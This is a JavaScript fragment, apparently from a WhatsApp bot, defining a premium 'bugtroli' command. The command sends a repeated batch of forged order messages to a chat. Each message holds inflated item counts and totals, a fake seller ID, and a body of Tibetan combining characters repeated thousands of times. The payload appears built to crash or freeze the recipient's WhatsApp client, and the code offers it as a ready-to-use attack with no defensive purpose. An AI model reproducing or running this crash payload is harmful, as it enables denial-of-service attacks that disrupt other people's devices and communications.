case 'bugtroli': {
if (!isPremium) return msgreply(mess.premium)
if (!q) return msgreply(`Penggunaan .${command} 6`)
jumlah = q * 2
for (let i = 0; i < jumlah; i++) {
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"orderMessage": {
"orderId": "594071395007984",
"orderImage": fakejpg,
"itemCount": 100000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"message": unic.n1 + `ྦྷཱཱཱིིུྦྷྪྦྷཻཹཱཱིུླཱཱཱྀིཻུུླྀཷཱཱཱཱཱཱཱིཻིིིུུུྦྷ`.repeat(3106),
"jpegThumbnail": dlapan,
"orderTitle": `⟠ 𝕯𝕬𝕲𝕲𝕰𝕽 𝕶𝕴𝕶𝕰𝕽 ⿻`,
"sellerJid": "0@s.whatsapp.net",
"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
"totalAmount1000": "500000000000000",
"totalCurrencyCode": "IDR",
}
}), { userJid: m.chat, quoted: m })
joestar.relayMessage(m.chat, order.message, { messageId: order.key.id })
}
}
break
